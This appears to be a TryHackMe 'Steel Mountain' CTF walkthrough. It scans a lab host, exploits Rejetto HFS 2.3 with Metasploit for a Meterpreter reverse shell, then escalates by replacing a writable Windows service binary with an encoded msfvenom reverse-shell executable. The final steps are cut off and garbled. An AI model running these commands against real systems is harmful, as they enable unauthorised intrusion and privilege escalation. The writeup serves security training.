# Room Information

Room link: [https://tryhackme.com/room/agentsudoctf](https://tryhackme.com/room/steelmountain)

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/20/2023

# Task 1: Introduction

```Bash
root@ip-10-10-199-181:~# firefox 10.10.206.36
```

![]()

# Task 2: Initial Access

```Bash
root@ip-10-10-199-181:~# nmap -sC -sV 10.10.206.36

Starting Nmap 7.60 ( https://nmap.org ) at 2023-07-20 18:52 BST
Nmap scan report for ip-10-10-206-36.eu-west-1.compute.internal (10.10.206.36)
Host is up (0.00044s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl          Microsoft SChannel TLS
| fingerprint-strings: 
|   TLSSessionReq: 
|     steelmountain0
|     230719174716Z
|     240118174716Z0
|     steelmountain0
|     #cfv
|     ;8D<J
|     18n6i
|     $0"0
|     BM)het
|_    y4)S
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2023-07-19T17:47:16
|_Not valid after:  2024-01-18T17:47:16
|_ssl-date: 2023-07-20T17:54:51+00:00; 0s from scanner time.
8080/tcp  open  http         HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.60%I=7%D=7/20%Time=64B974BB%P=x86_64-pc-linux-gnu%r(TL
SF:SSessionReq,346,"\x16\x03\x03\x03A\x02\0\0M\x03\x03d\xb9t\xb6\x8e\x16#U
SF:\x20E\x11\xeb\]\x17B\xc1\xac\xd3\xe4\xa0>\x86\xae\xc4\xc4\xe8\x1f\xc2\x
SF:01X\xedW\x206\.\0\0J\x8b\x1f\x97\xa7\x0b\]~\xd8~\xfa1\xb4a\]\xe7\xfb\x1
SF:d`\xa6\xe7\xf4\xe1\xfa:#8\xb2\0/\0\0\x05\xff\x01\0\x01\0\x0b\0\x02\xe8\
SF:0\x02\xe5\0\x02\xe20\x82\x02\xde0\x82\x01\xc6\xa0\x03\x02\x01\x02\x02\x
SF:10F\xbe!\xfe\n\xebb\x97D/\xf6\x19\xc4\xbb\xb9\x9e0\r\x06\t\*\x86H\x86\x
SF:f7\r\x01\x01\x05\x05\x000\x181\x160\x14\x06\x03U\x04\x03\x13\rsteelmoun
SF:tain0\x1e\x17\r230719174716Z\x17\r240118174716Z0\x181\x160\x14\x06\x03U
SF:\x04\x03\x13\rsteelmountain0\x82\x01\"0\r\x06\t\*\x86H\x86\xf7\r\x01\x0
SF:1\x01\x05\0\x03\x82\x01\x0f\x000\x82\x01\n\x02\x82\x01\x01\0\xbf\xb3\xd
SF:c\xbf\x10q\xed\x8d\x06\xfe\xb4\xa1B\x88eE\x10k\xbdF\xbf\xf8\x04L\xfdz\x
SF:9e\+\+\x85\x93\x04\xd8\x1cD\xea\x08\x9e\x11A\x0e#cfv\xaf5\xdc\xf7\xa6H\
SF:x93\xe72\xc6\x8a\xb8fF\xc2s\xd2\xd1Q\xabI\xbb\x12SD\xf0\xc22~\x85\xd6Y\
SF:x14\xaf\xfd\xd2\x0cg\xdd\xe47\xda\xcf8\x92\x1a1,9\x81;il\x9c;\xa9\xf1\x
SF:d5\]#\xf4\xae\xd1\xa9\xb9~\x9e\.lI\xa4\xcd\$#\xf2\xb0\x0b;8D<J\xb6M\x81
SF:\x8fT\x1a\|P\xfd=\x01\x1c\xc7b\xd3\x7f0xY\x86u\x1a\x8f\x15\xd0\xcc\xc9\
SF:xd1\x9c\xafFr:\xf9{\x8cfW\xc8\x08\xde\xc3\xe6\xf5\xe4OF\xce\xcb\xc6\xdf
SF:&\x194sB\xc9RI\xe4\x20\xfc=\x87\xb7&\x9e\xe0\x12\xd4\xe8;\xb0\xa37\)_\x
SF:fa=\x9dK\x1a\xb5\x9d\x0025q\x16\x1a\xa8\xc7\x0c\xb7G\xdc18n6i\x88\x06H\
SF:xcd~\xd5\xd7L\x81\xa23\0\xf4jm\xe5s\x11\x07'J\xdf\x18\xb2oS7\xf7\x02\x0
SF:3\x01\0\x01\xa3\$0\"0\x13\x06\x03U\x1d%\x04\x0c0\n\x06\x08\+\x06\x01\x0
SF:5\x05\x07\x03\x010\x0b\x06\x03U\x1d\x0f\x04\x04\x03\x02\x0400\r\x06\t\*
SF:\x86H\x86\xf7\r\x01\x01\x05\x05\0\x03\x82\x01\x01\0\x0cm\x7f\xa9e\x08k\
SF:xee\"\|\$\x19d\xe9\xac\xd3\xa5\xd2p\xb3BM\)het\xec\x17\xc9\xd8\x9d\xcc\
SF:x11\n\x14%f\xddH\x97\x8f\xd9\xbd\x87/\xa3\xef\x13\xd3\x05C\xe6\xfb1G\xc
SF:d\x14\xdc_\x96\x10\xe9Ym\xae\x97\?\xd3\x9f\x85S\xc6\xda\xfe\x0c\xdaC\xc
SF:4\x90\x8d\x80\xc9T\xcb\x8f\xb2\xfb\xf0\xadp\xbf\xe9O\xe7g\xfe\x05bn\xb8
SF:Q\x16\+Y\x07\x8e\x02\x9c3P\xab\xe1\xb03\xab\xb7\x83\xf7\r\x81_\xba\x86\
SF:xf01\xda\xac\x97\xfa\xdc\xc8sM\xde\xb6\x80!<\x1f\xd5\(\xf5\)\x15\x1e\+\
SF:xfd\xbc\x86X\xe5\x0b\|h\xbau\xd5d\x8dul\xd5,\x8c6CP\x1ey4\)S\xce%9\xd4{
SF:\xe70\)g\xf9zZ\x84\xa8\x7f\xfe\xb0q\xc8\x9f\xda\x15t\x1b\x13\xd8\xbd\x8
SF:6g\x8c}\xda\xe8\x16t\x8f\xe2\xec\xfei\xc5\x80\xf2H\x04\xc1\x16\x87\x84\
SF:xe7\xe0I\xff\x16\x10\xc4\xc8\xb2\xa3\n\x9f\x8d&\n\n\xf2\xad\xddG9\xf0\0
SF:\xa0JXz\xd5\xa3k\xe2\xfbv\x1dd\x0e\0\0\0");
MAC Address: 02:C2:5B:66:D1:05 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:c2:5b:66:d1:05 (unknown)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-20 18:54:51
|_  start_date: 2023-07-20 18:47:06

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.58 seconds
```

```Bash
root@ip-10-10-199-181:~# firefox 10.10.206.36:8080
```

![]()

![]()

```Bash
root@ip-10-10-199-181:~# searchsploit --verbose --www rejetto HTTP file server 2.3
[i] Found (#2): /opt/searchsploit/files_exploits.csv
[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#2): /opt/searchsploit/files_shellcodes.csv
[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)

[i] Version ID: 2.3
----------------------------------- --------------------------------------------
 Exploit Title                     |  URL
----------------------------------- --------------------------------------------
Rejetto HTTP File Server (HFS) 2.2 | https://www.exploit-db.com/exploits/30850
Rejetto HTTP File Server (HFS) 2.3 | https://www.exploit-db.com/exploits/34668
Rejetto HTTP File Server (HFS) 2.3 | https://www.exploit-db.com/exploits/34852
Rejetto HTTP File Server (HFS) 2.3 | https://www.exploit-db.com/exploits/39161
----------------------------------- --------------------------------------------
Shellcodes: No Results
```

```Bash
root@ip-10-10-199-181:~# firefox https://www.exploit-db.com/exploits/34668
```

```Bash
root@ip-10-10-199-181:~# msfconsole
                                                  

                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v6.3.26-dev-                         ]
+ -- --=[ 2333 exploits - 1220 auxiliary - 413 post       ]
+ -- --=[ 1383 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use the analyze command to suggest 
runnable modules for hosts
Metasploit Documentation: https://docs.metasploit.com/
```

```Bash
msf6 > search Rejetto HTTP File Server 2.3

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec
```

```Bash
msf6 > use exploit/windows/http/rejetto_hfs_exec 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

```Bash
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating we
                                         b server
   Proxies                     no        A proxy chain of format type:host:por
                                         t[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.
                                         metasploit.com/docs/using-metasploit/
                                         basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface t
                                         o listen on. This must be an address
                                         on the local machine or 0.0.0.0 to li
                                         sten on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connec
                                         tions
   SSLCert                     no        Path to a custom SSL certificate (def
                                         ault is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (defa
                                         ult is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thr
                                        ead, process, none)
   LHOST     10.10.199.181    yes       The listen address (an interface may b
                                        e specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```

```Bash
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.206.36
RHOSTS => 10.10.206.36
```

```Bash
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080
```

```Bash
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.199.181:4444 
[*] Using URL: http://10.10.199.181:8080/aYSbcaV
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /aYSbcaV
[*] Sending stage (175686 bytes) to 10.10.206.36
[!] Tried to delete %TEMP%\FmDgo.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.199.181:4444 -> 10.10.206.36:49239) at 2023-07-20 19:22:52 +0100
[*] Server stopped.
```

```Bash
meterpreter > pwd
C:\Users\bill\Desktop
```

```Bash
meterpreter > ls
Listing: C:\Users\bill\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-09-27 12:07:07 +0100  desktop.ini
100666/rw-rw-rw-  70    fil   2019-09-27 13:42:38 +0100  user.txt
```

```Bash
meterpreter > cat user.txt
\ufffd\ufffdb04763b6fcf51fcd7c13abc7db4fd365
```

# Task 3: Privilege Escalation

```Bash
root@ip-10-10-199-181:~# wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
--2023-07-20 20:10:20--  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 600580 (587K) [text/plain]
Saving to: \u2018PowerUp.ps1\u2019

PowerUp.ps1       100%[=============>] 586.50K  --.-KB/s    in 0.05s   

2023-07-20 20:10:20 (11.1 MB/s) - \u2018PowerUp.ps1\u2019 saved [600580/600580]
```

```Bash
meterpreter > upload ~/PowerUp.ps1
[*] Uploading  : /root/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /root/PowerUp.ps1 -> PowerUp.ps1
[*] Completed  : /root/PowerUp.ps1 -> PowerUp.ps1
```

```Bash
meterpreter > ls
Listing: C:\Users\bill\Desktop
==============================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100666/rw-rw-rw-  600580  fil   2023-07-20 20:11:11 +0100  PowerUp.ps1
100666/rw-rw-rw-  282     fil   2019-09-27 12:07:07 +0100  desktop.ini
100666/rw-rw-rw-  70      fil   2019-09-27 13:42:38 +0100  user.txt
```

```Bash
meterpreter > load PowerShell
Loading extension powershell...Success.
```

```Bash
meterpreter > powershell_shell
```

```PowerShell
PS > . .\PowerUp.ps1
```

```PowerShell
PS > Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

ServiceName                     : IObitUnSvr
Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
CanRestart                      : False
Name                            : IObitUnSvr
Check                           : Modifiable Service Files

ServiceName                     : LiveUpdateSvc
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
CanRestart                      : False
Name                            : LiveUpdateSvc
Check                           : Modifiable Service Files
```

```Bash
root@ip-10-10-199-181:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.199.181 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe-service file: 15872 bytes
Saved as: Advanced.exe
```

```PowerShell
PS > ^C
Terminate channel 5? [y/N]  y
```

```Bash
meterpreter > upload /root/Advanced.exe
[*] Uploading  : /root/Advanced.exe -> Advanced.exe
[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /root/Advanced.exe -> Advanced.exe
[*] Completed  : /root/Advanced.exe -> Advanced.exe
```

```Bash
meterpreter > powershell_shell
```

```PowerShell
PS > sc stop AdvancedSystemCareService9
```

```copy ASCService C:\Program Files (x86)\IObit\AdvancedSystemCare\ASCService.exe


# Task 4: Access and Escalation Without Metasploit
